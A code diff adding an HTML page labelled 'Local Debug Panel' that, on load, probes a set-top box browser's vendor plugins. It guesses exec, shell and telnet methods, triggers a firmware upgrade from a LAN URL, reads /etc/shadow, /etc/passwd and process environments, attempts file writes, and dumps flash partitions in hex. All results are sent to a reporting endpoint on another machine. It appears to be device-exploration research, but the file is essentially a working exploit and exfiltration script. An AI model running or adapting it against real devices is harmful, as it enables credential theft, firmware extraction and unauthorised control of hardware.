@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<title>Local Debug Panel</title>
+<style type="text/css">
+html,body { margin:0; padding:0; width:1280px; height:720px; overflow:hidden; background:#0b0b0b; color:#ddd; font-family:Arial,Helvetica,sans-serif; font-size:11px; }
+#hdr { padding:5px 8px 0 8px; font-size:16px; color:#7CFC00; }
+#st { font-size:12px; color:#7CFC00; }
+#sub { padding:1px 8px 4px 8px; color:#888; font-size:10px; }
+.cols { width:1272px; margin:0 4px; }
+.col { float:left; width:416px; margin-right:6px; }
+.col.last { margin-right:0; }
+h2 { font-size:11px; margin:0 0 2px 0; color:#7CFC00; border-bottom:1px solid #333; padding-bottom:1px; }
+.box { height:595px; overflow:hidden; background:#000; border:1px solid #333; padding:3px; }
+.row { border-bottom:1px solid #171717; padding:0; line-height:1.18; white-space:nowrap; overflow:hidden; }
+.k { color:#9ad; }
+.v { color:#eee; }
+.ok { color:#7CFC00; }
+.err { color:#ff6b6b; }
+.dim { color:#777; }
+</style>
+</head>
+<body>
+<div id="hdr">LOCAL DEBUG PANEL <span id="st">running...</span></div>
+<div id="sub">token <span id="tok">...</span> | all results are auto-sent to the Mac, nothing to scroll</div>
+<div class="cols">
+  <div class="col"><h2>PLUGIN METHODS / SYSTEM / UPGRADE</h2><div class="box" id="c1"></div></div>
+  <div class="col"><h2>OIPF OBJECTS / APP MANAGER / CONFIG</h2><div class="box" id="c2"></div></div>
+  <div class="col last"><h2>FILES / WRITE TESTS</h2><div class="box" id="c3"></div></div>
+</div>
+
+<object type="valups/system" id="system" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+<object type="valups/upgrade" id="upgrade" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+<object type="valups/maxdome" id="maxdome" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+<object type="valups/mediainfo" id="mediainfo" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+<object type="application/oipfApplicationManager" id="appmgr" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+<object type="application/oipfConfiguration" id="oipfcfg" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+<object type="application/oipfObjectFactory" id="oipfObjectFactory" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+<object type="application/oipfCapabilities" id="oipfcap" style="position:absolute;left:0;top:0;width:0;height:0;"></object>
+
+<script type="text/javascript">
+var token = String(new Date().getTime()) + "-" + String(Math.floor(Math.random() * 1000000));
+var sent = 0;
+var rows = {c1: 0, c2: 0, c3: 0};
+var MAXROWS = 38;
+
+function esc(s) {
+    if (s === null || s === undefined) return "";
+    return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
+}
+function setStatus(t) { var e = document.getElementById("st"); if (e) e.innerHTML = esc(t); }
+function add(boxId, k, v) {
+    var b = document.getElementById(boxId);
+    if (!b) return;
+    rows[boxId] = (rows[boxId] || 0) + 1;
+    if (rows[boxId] > MAXROWS) return;
+    var cls = "v";
+    var s = String(v);
+    if (s.indexOf("ERR") === 0) cls = "v err";
+    else if (s.indexOf("OK") === 0 || s.indexOf("yes") === 0 || s.indexOf("200") === 0) cls = "v ok";
+    b.innerHTML += '<div class="row"><span class="k">' + esc(k) + ':</span> <span class="' + cls + '">' + esc(s).substring(0, 120) + '</span></div>';
+}
+function send(k, v) {
+    try {
+        var im = new Image();
+        im.src = "/api/report?token=" + encodeURIComponent(token) +
+                 "&k=" + encodeURIComponent(k) +
+                 "&v=" + encodeURIComponent(String(v).substring(0, 340)) +
+                 "&n=" + (sent++) + "&r=" + Math.random();
+    } catch (e) {}
+}
+function sendLong(k, v) {
+    v = String(v);
+    var i;
+    for (i = 0; i < v.length && i < 4000; i += 340) send(k + "." + i, v.substring(i, i + 340));
+}
+function logBoth(boxId, k, v) { add(boxId, k, v); send(k, v); }
+
+function keysOf(o) {
+    var out = [], seen = {}, i, k;
+    try {
+        var own = Object.getOwnPropertyNames(o);
+        for (i = 0; i < own.length; i++) { k = own[i]; if (!seen[k]) { seen[k] = 1; out.push(k); } }
+    } catch (e) {}
+    try {
+        for (k in o) { if (!seen[k]) { seen[k] = 1; out.push(k); } }
+    } catch (e) {}
+    return out;
+}
+
+function callOne(boxId, prefix, o, name, arg) {
+    var fn;
+    try { fn = o[name]; } catch (e) { logBoth(boxId, prefix + "." + name + ".get", "ERR:" + (e.message || e)); return; }
+    if (typeof fn != "function") { return; }
+    var label = prefix + "." + name + (arg === undefined ? "()" : "(" + String(arg).substring(0, 30) + ")");
+    try {
+        var r = (arg === undefined) ? fn.call(o) : fn.call(o, arg);
+        var rs = "OK:" + (typeof r) + ":" + String(r).substring(0, 80);
+        logBoth(boxId, label, rs);
+    } catch (e) {
+        logBoth(boxId, label, "ERR:" + (e.message || e));
+    }
+}
+
+function probeObject(id, prefix, boxId, methods, args) {
+    var o = document.getElementById(id);
+    logBoth(boxId, prefix + ".exists", o ? "yes" : "no");
+    if (!o) return;
+    var ks = keysOf(o), i, k, v;
+    for (i = 0; i < ks.length && i < 60; i++) {
+        k = ks[i];
+        try { v = o[k]; } catch (e) { v = "ERR"; }
+        if (typeof v == "function") {
+            var fl = "";
+            try { fl = "fn/" + v.length; } catch (e) { fl = "fn"; }
+            add(boxId, prefix + "." + k, fl);
+            send(prefix + "." + k, fl);
+        } else if (v !== undefined && v !== null && String(v) !== "") {
+            add(boxId, prefix + "." + k, v);
+            send(prefix + "." + k, v);
+        }
+    }
+    if (methods) {
+        for (i = 0; i < methods.length; i++) {
+            callOne(boxId, prefix, o, methods[i]);
+            if (args) {
+                var j;
+                for (j = 0; j < args.length; j++) callOne(boxId, prefix, o, methods[i], args[j]);
+            }
+        }
+    }
+}
+
+function probeValue(prefix, o, boxId, methods, args) {
+    logBoth(boxId, prefix + ".exists", o ? "yes" : "no");
+    if (!o) return;
+    var ks = keysOf(o), i, k, v;
+    for (i = 0; i < ks.length && i < 80; i++) {
+        k = ks[i];
+        try { v = o[k]; } catch (e) { v = "ERR"; }
+        if (typeof v == "function") {
+            var fl = "fn";
+            try { fl = "fn/" + v.length; } catch (e) {}
+            add(boxId, prefix + "." + k, fl);
+            send(prefix + "." + k, fl);
+        } else if (v !== undefined && v !== null && String(v) !== "") {
+            add(boxId, prefix + "." + k, v);
+            send(prefix + "." + k, v);
+        }
+    }
+    if (methods) {
+        for (i = 0; i < methods.length; i++) {
+            callOne(boxId, prefix, o, methods[i]);
+            if (args) {
+                var j;
+                for (j = 0; j < args.length; j++) callOne(boxId, prefix, o, methods[i], args[j]);
+            }
+        }
+    }
+}
+
+function probeNested() {
+    var cfg = document.getElementById("oipfcfg");
+    if (!cfg) return;
+    var conf, ls, ks;
+    try { conf = cfg.configuration; } catch (e) {}
+    try { ls = cfg.localSystem; } catch (e) {}
+    try { ks = cfg.keyset; } catch (e) {}
+    probeValue("cfg.configuration", conf, "c2", ["getValue", "setValue", "getConfig", "setConfig"], [undefined]);
+    probeValue("cfg.localSystem", ls, "c2", null, null);
+    probeValue("cfg.keyset", ks, "c2", null, null);
+    if (ls) {
+        var names = keysOf(ls), i, k, v;
+        for (i = 0; i < names.length && i < 100; i++) {
+            k = names[i];
+            try { v = ls[k]; } catch (e) { v = null; }
+            if (typeof v == "function" && /^(get|is)/i.test(k) && v.length === 0) {
+                try {
+                    var r = v.call(ls);
+                    logBoth("c2", "ls." + k + "()", "OK:" + typeof r + ":" + String(r).substring(0, 100));
+                } catch (e) {
+                    logBoth("c2", "ls." + k + "()", "ERR:" + (e.message || e));
+                }
+            }
+        }
+    }
+}
+
+function probeUpgradeDeep() {
+    var u = document.getElementById("upgrade");
+    if (!u) return;
+    try { logBoth("c1", "upg.upgrade.length", u.upgrade ? u.upgrade.length : "none"); } catch (e) {}
+    try { logBoth("c1", "upg.forcedupgrade.length", u.forcedupgrade ? u.forcedupgrade.length : "none"); } catch (e) {}
+    try { logBoth("c1", "upg.upgrade.src", String(u.upgrade).substring(0, 300)); } catch (e) {}
+    try { logBoth("c1", "upg.forcedupgrade.src", String(u.forcedupgrade).substring(0, 300)); } catch (e) {}
+    var calls = [
+        ["upgrade()", function () { return u.upgrade(); }],
+        ["upgrade(url)", function () { return u.upgrade("http://192.168.1.18:5080/fw.hdf"); }]
+    ];
+    var i;
+    for (i = 0; i < calls.length; i++) {
+        try {
+            var r = calls[i][1]();
+            logBoth("c1", "upg." + calls[i][0], "OK:" + typeof r + ":" + String(r).substring(0, 80));
+        } catch (e) {
+            logBoth("c1", "upg." + calls[i][0], "ERR:" + (e.message || e));
+        }
+    }
+}
+
+function probeAppMgrDeep() {
+    var a = document.getElementById("appmgr");
+    if (!a) return;
+    var args = [document, window, a, document.getElementById("oipfcfg"), document.getElementById("system")];
+    var i;
+    for (i = 0; i < args.length; i++) {
+        callOne("c2", "appmgr", a, "getOwnerApplication", args[i]);
+        callOne("c2", "appmgr", a, "getChildApplications", args[i]);
+        callOne("c2", "appmgr", a, "createApplication", args[i]);
+        callOne("c2", "appmgr", a, "installApplication", args[i]);
+        callOne("c2", "appmgr", a, "getApplication", args[i]);
+    }
+}
+
+var GUESS = ["startUpgrade", "startUpgradeFromUrl", "upgrade", "start", "stop", "check", "checkUpgrade",
+             "download", "downloadFile", "getVersion", "getStatus", "getUpgradeStatus", "getProgress",
+             "setUrl", "setURL", "setSource", "setFile", "setPath", "getFile", "getPath",
+             "readFile", "writeFile", "saveFile", "copyFile",
+             "execute", "exec", "run", "command", "shell", "telnet", "telnetd", "startTelnet",
+             "enableTelnet", "setTelnet",
+             "setSystemId", "setSystemID", "getSystemId", "getSystemID", "getSystemInfo",
+             "setSerialNumber", "getSerialNumber", "setMac", "getMac", "getIP", "setIP",
+             "getModel", "getModelName", "getSoftwareVersion", "getDeviceId", "getDeviceID",
+             "setLanguage", "getLanguage", "getNetwork", "setNetwork", "getConfig", "setConfig",
+             "getValue", "setValue", "getPreference", "setPreference", "notify", "init"];
+
+function probeAll() {
+    probeObject("system", "sys", "c1", [], null);
+    probeObject("upgrade", "upg", "c1", [], null);
+    probeObject("maxdome", "max", "c1", [], null);
+    probeObject("mediainfo", "mi", "c1", [], null);
+    probeObject("appmgr", "appmgr", "c2", [], null);
+    probeObject("oipfcfg", "cfg", "c2", [], null);
+    probeObject("oipfObjectFactory", "factory", "c2", [], null);
+    probeObject("oipfcap", "cap", "c2", [], null);
+}
+
+var FILES = ["/etc/passwd", "/etc/shadow", "/etc/inittab", "/etc/init.d/rcS",
+             "/etc/profile", "/etc/default/rcS", "/etc/fstab", "/etc/hosts",
+             "/etc/resolv.conf", "/etc/network/interfaces", "/etc/hostname",
+             "/etc/version", "/etc/motd", "/etc/issue", "/etc/TZ",
+             "/etc/init.d/S01logging", "/etc/init.d/S10mdev", "/etc/init.d/S20urandom",
+             "/etc/init.d/S40network", "/etc/init.d/S41dhcpcd", "/etc/init.d/S45firewall",
+             "/etc/init.d/S50telnet", "/etc/init.d/S60crond", "/etc/init.d/S70ftpd",
+             "/etc/init.d/S80httpd", "/etc/init.d/S90telnetd", "/etc/init.d/S99telnetd",
+             "/etc/init.d/S99start", "/etc/init.d/S90start", "/etc/init.d/S95start",
+             "/etc/init.d/S99hx", "/etc/rc.local", "/etc/init.d/",
+             "/proc/self/status", "/proc/self/mounts", "/proc/mounts",
+             "/proc/filesystems", "/proc/net/route", "/proc/net/arp", "/proc/net/dev",
+             "/proc/1/cmdline", "/proc/1/environ",
+             "/home/settop/.profile", "/home/settop/.bashrc", "/root/.profile",
+             "/etc/init.d/X90settop", "/etc/init.d/X01logging", "/etc/init.d/X10network",
+             "/etc/init.d/X20network", "/etc/init.d/X40network", "/etc/init.d/X50telnet",
+             "/etc/init.d/X99settop", "/var/log/messages", "/var/log/syslog",
+             "/var/log/dmesg", "/var/log/init.log", "/tmp/messages",
+             "/etc/init.d/S10settop", "/etc/init.d/S20settop", "/etc/init.d/S30settop",
+             "/etc/init.d/S40settop", "/etc/init.d/S50settop", "/etc/init.d/S60settop",
+             "/etc/init.d/S70settop", "/etc/init.d/S80settop", "/etc/init.d/S90settop",
+             "/etc/init.d/S99settop", "/etc/init.d/S10network", "/etc/init.d/S20network",
+             "/etc/init.d/S30network", "/etc/init.d/S50network", "/etc/init.d/S90network",
+             "/etc/init.d/S10app", "/etc/init.d/S20app", "/etc/init.d/S90app",
+             "/etc/init.d/S10humaxtv", "/etc/init.d/S20humaxtv", "/etc/init.d/S90humaxtv",
+             "/etc/init.d/S10portal", "/etc/init.d/S20portal", "/etc/init.d/S90portal",
+             "/etc/init.d/S10browser", "/etc/init.d/S20browser", "/etc/init.d/S90browser"];
+
+function probeFile(path) {
+    try {
+        var x = new XMLHttpRequest();
+        x.open("GET", "file://" + path, true);
+        try { x.overrideMimeType("text/plain"); } catch (e) {}
+        x.onreadystatechange = function () {
+            if (x.readyState == 4) {
+                var t = "";
+                try { t = x.responseText || ""; } catch (e) {}
+                var line = "status=" + x.status + " len=" + t.length;
+                add("c3", path, line);
+                send("file." + path + ".status", line);
+                if (t) sendLong("file." + path + ".data", t.substring(0, 1200));
+            }
+        };
+        x.send(null);
+    } catch (e) {
+        logBoth("c3", "file." + path + ".err", "ERR:" + (e.message || e));
+    }
+}
+
+function probeWrite() {
+    var tests = [
+        ["PUT", "/tmp/hx_put"], ["POST", "/tmp/hx_post"],
+        ["PUT", "/etc/hx_put"], ["POST", "/etc/hx_post"],
+        ["PUT", "/home/settop/hx_put"], ["POST", "/home/settop/hx_post"]
+    ];
+    var i;
+    for (i = 0; i < tests.length; i++) {
+        (function (method, path) {
+            try {
+                var x = new XMLHttpRequest();
+                x.open(method, "file://" + path, true);
+                x.onreadystatechange = function () {
+                    if (x.readyState == 4) {
+                        logBoth("c3", method + " " + path, "status=" + x.status);
+                        var y = new XMLHttpRequest();
+                        y.open("GET", "file://" + path, true);
+                        y.onreadystatechange = function () {
+                            if (y.readyState == 4) {
+                                var t = "";
+                                try { t = y.responseText || ""; } catch (e) {}
+                                logBoth("c3", "GET " + path, "status=" + y.status + " len=" + t.length + " " + t.substring(0, 40));
+                            }
+                        };
+                        y.send(null);
+                    }
+                };
+                x.send("HXWRITE");
+            } catch (e) {
+                logBoth("c3", method + " " + path + ".err", "ERR:" + (e.message || e));
+            }
+        })(tests[i][0], tests[i][1]);
+    }
+}
+
+/* ------------- flash / mtd dumper ------------- */
+function startXhr(method, url, onload, range) {
+    var x = new XMLHttpRequest();
+    x.open(method, url, true);
+    try { x.overrideMimeType("text/plain; charset=x-user-defined"); } catch (e) {}
+    if (range) {
+        try { x.setRequestHeader("Range", range); } catch (e) {}
+    }
+    if (onload) {
+        x.onreadystatechange = function () {
+            if (x.readyState == 4) { try { onload(x); } catch (e) {} }
+        };
+    }
+    try { x.send(null); }
+    catch (e) { if (onload) setTimeout(function () { onload(x); }, 0); }
+    return x;
+}
+function hexSlice(t, start, end) {
+    var arr = new Array(), i, c;
+    for (i = start; i < end; i++) {
+        c = t.charCodeAt(i) & 255;
+        arr.push((c < 16 ? "0" : "") + c.toString(16));
+    }
+    return arr.join("");
+}
+function uploadHex(name, off, hex, cb) {
+    var x = new XMLHttpRequest();
+    x.open("POST", "/api/report?name=" + encodeURIComponent(name) + "&off=" + off + "&kind=upload&hex=1", true);
+    try { x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); } catch (e) {}
+    x.onreadystatechange = function () {
+        if (x.readyState == 4) {
+            var ok = (x.status >= 200 && x.status < 300);
+            send("dump." + name + ".up" + off, "status=" + x.status);
+            if (cb) cb(ok);
+        }
+    };
+    try { x.send("d=" + hex); }
+    catch (e) {
+        send("dump." + name + ".uperr" + off, "ERR:" + (e.message || e));
+        if (cb) cb(false);
+    }
+}
+function uploadSlice(t, name, off, total, chunk, done) {
+    if (off >= total) {
+        send("dump." + name + ".done", "done " + total);
+        if (done) done();
+        return;
+    }
+    var end = Math.min(off + chunk, total);
+    var hex = hexSlice(t, off, end);
+    uploadHex(name, off, hex, function (ok) {
+        hex = "";
+        if (!ok) {
+            send("dump." + name + ".stop", "off=" + off);
+            if (done) done();
+            return;
+        }
+        setTimeout(function () { uploadSlice(t, name, end, total, chunk, done); }, 5);
+    });
+}
+function dumpRange(path, name, off, total, chunk, done) {
+    if (off >= total) {
+        send("dump." + name + ".done", "done " + off);
+        if (done) done();
+        return;
+    }
+    var end = Math.min(off + chunk, total);
+    startXhr("GET", "file://" + path, function (x) {
+        var t = x.responseText || "";
+        if (!t.length) {
+            send("dump." + name + ".stop", "off=" + off + " status=" + x.status);
+            if (done) done();
+            return;
+        }
+        var hex = hexSlice(t, 0, Math.min(t.length, end - off));
+        uploadHex(name, off, hex, function (ok) {
+            hex = "";
+            t = "";
+            if (!ok) {
+                send("dump." + name + ".stop", "off=" + off + " upfail");
+                if (done) done();
+                return;
+            }
+            setTimeout(function () { dumpRange(path, name, end, total, chunk, done); }, 5);
+        });
+    }, "bytes=" + off + "-" + (end - 1));
+}
+var RANGE_OK = {};
+var MTDINFO = {};
+function storeText(path, key) {
+    startXhr("GET", "file://" + path, function (x) {
+        var t = "";
+        try { t = x.responseText || ""; } catch (e) {}
+        MTDINFO[key] = t.replace(/[\r\n]/g, "");
+        send("store." + key, "status=" + x.status + " len=" + t.length + " val=" + t.substring(0, 60));
+    });
+}
+var dumpQueue = [];
+var dumpBusy = false;
+function dumpNext() {
+    if (dumpBusy) return;
+    if (!dumpQueue.length) return;
+    var job = dumpQueue.shift();
+    dumpBusy = true;
+    var path = job[0], name = job[1], size = job[2], full = job[3];
+    startXhr("GET", "file://" + path, function (x) {
+        var t = "";
+        try { t = x.responseText || ""; } catch (e) {}
+        var isErr = (t.substring(0, 5) == "<html" || t.substring(0, 5) == "<HTML");
+        RANGE_OK[name] = (t.length == 2048);
+        send("dump." + name + ".probe", "status=" + x.status + " len=" + t.length +
+             " range=" + (RANGE_OK[name] ? "yes" : "no") + " err=" + isErr);
+        if (isErr || !t.length) {
+            dumpBusy = false;
+            setTimeout(dumpNext, 100);
+            return;
+        }
+        uploadHex(name + ".head", 0, hexSlice(t, 0, Math.min(t.length, 2048)), function (ok) {
+            if (!full || !ok) {
+                dumpBusy = false;
+                setTimeout(dumpNext, 100);
+                return;
+            }
+            if (RANGE_OK[name] && size > 2048) {
+                dumpRange(path, name, 2048, size, 16384, function () {
+                    dumpBusy = false;
+                    setTimeout(dumpNext, 100);
+                });
+            } else if (size > 2048 && size <= 24 * 1024 * 1024) {
+                var total = Math.min(t.length, size);
+                send("dump." + name + ".whole", "len=" + t.length + " cap=" + total);
+                uploadSlice(t, name, 2048, total, 16384, function () {
+                    dumpBusy = false;
+                    setTimeout(dumpNext, 100);
+                });
+                t = "";
+            } else {
+                send("dump." + name + ".skip", "size=" + size + " len=" + t.length);
+                t = "";
+                dumpBusy = false;
+                setTimeout(dumpNext, 100);
+            }
+        });
+    }, "bytes=0-2047");
+}
+function probeFlash() {
+    var i;
+    storeText("/proc/mtd", "proc.mtd");
+    storeText("/proc/partitions", "proc.partitions");
+    storeText("/proc/devices", "proc.devices");
+    for (i = 0; i < 8; i++) {
+        storeText("/sys/class/mtd/mtd" + i + "/name", "mtd" + i + ".name");
+        storeText("/sys/class/mtd/mtd" + i + "/size", "mtd" + i + ".size");
+        storeText("/sys/class/mtd/mtd" + i + "/erasesize", "mtd" + i + ".erasesize");
+        storeText("/sys/class/mtd/mtd" + i + "/type", "mtd" + i + ".type");
+    }
+    setTimeout(function () {
+        var i, dev = null, sz = 0, nm = "", szn;
+        for (i = 0; i < 8; i++) {
+            dev = "/dev/mtdblock" + i;
+            dumpQueue.push([dev, "mtdblock" + i, 2048, false]);
+        }
+        dumpNext();
+    }, 2500);
+    setTimeout(function () {
+        var i, sz, nm, dev;
+        for (i = 0; i < 8; i++) {
+            sz = parseInt(MTDINFO["mtd" + i + ".size"], 10);
+            nm = (MTDINFO["mtd" + i + ".name"] || ("mtd" + i)).replace(/[^A-Za-z0-9_]/g, "");
+            dev = "/dev/mtdblock" + i;
+            if (sz > 0 && sz <= 24 * 1024 * 1024) {
+                dumpQueue.push([dev, "full_" + i + "_" + nm, sz, true]);
+            }
+        }
+        dumpNext();
+    }, 9000);
+}
+function init() {
+    document.getElementById("tok").innerHTML = esc(token);
+    setStatus("probing...");
+    probeAll();
+    probeNested();
+    probeUpgradeDeep();
+    probeAppMgrDeep();
+    var i;
+    for (i = 0; i < FILES.length; i++) probeFile(FILES[i]);
+    probeWrite();
+    probeFlash();
+    setTimeout(function () { setStatus("sent " + sent + " results"); }, 4000);
+}
+window.onload = init;
+</script>
+</body>
+</html>
